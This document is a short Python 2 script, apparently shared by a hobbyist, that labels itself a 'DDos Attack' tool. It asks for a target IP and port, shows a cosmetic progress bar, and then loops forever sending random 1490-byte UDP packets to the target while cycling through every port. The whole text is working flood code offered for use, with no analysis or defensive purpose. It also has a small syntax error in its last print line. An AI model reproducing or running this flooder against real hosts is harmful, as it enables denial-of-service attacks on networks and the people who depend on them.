import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print("\033[91m -Author   : ZieLx ")
print("\033[91m -Github   : github.com/notzielxxx2k ")
print("\033[91m -Discord  : ᶻⁱᵉᴸˣ²ᵏ⁺#7872 ")
ip = raw_input("IP Target : ")
port = input("PORT Target : ")

os.system("clear")
os.system("figlet Attack Starting")
print("\033[91m [                    ] 0% ")
time.sleep(5)
print("\033[91m [=====               ] 25% ")
time.sleep(5)
print("\033[91m [==========          ] 50% ")
time.sleep(5)
print("\033[91m [===============     ] 75% ")
time.sleep(5)
print("\033[91m [====================] 100% ")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("\033[91m Sent %s packet to %s throught port:%s"%(sent,ip,port) ")
     if port == 65534:
       port = 1 
